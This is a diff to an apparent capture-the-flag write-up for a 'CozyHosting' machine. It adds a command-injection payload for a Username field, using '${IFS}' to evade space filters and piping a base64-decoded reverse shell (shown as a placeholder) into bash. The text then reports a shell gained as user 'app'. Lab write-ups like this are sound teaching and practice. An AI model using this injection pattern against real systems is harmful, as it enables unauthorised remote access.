@@ -82,7 +82,9 @@ Just to confirm this, I filled in the Hostname and left the Username parameter b
 ![nmap](/img/cozyhosting/interesting.png)
 
 After doing research and trying a bunch of different techniques, I finally found a working payload which utilizes "${IFS}" to represent a space in turn bypassing any possible filters put in place, this followed by a reverse bash shell script encoded in base64. Lets fill in the Hostname parameter with any value and enter our payload in the Username parameter, make sure to startup a netcat listener and cross our fingers hoping for a connection.
-
+```bash
+;echo${IFS}"PAYLOAD"|base64${IFS}-d|bash;
+```
 ![nmap](/img/cozyhosting/payload.png)
 
 We have succesfully got a rev shell going as the user "app"
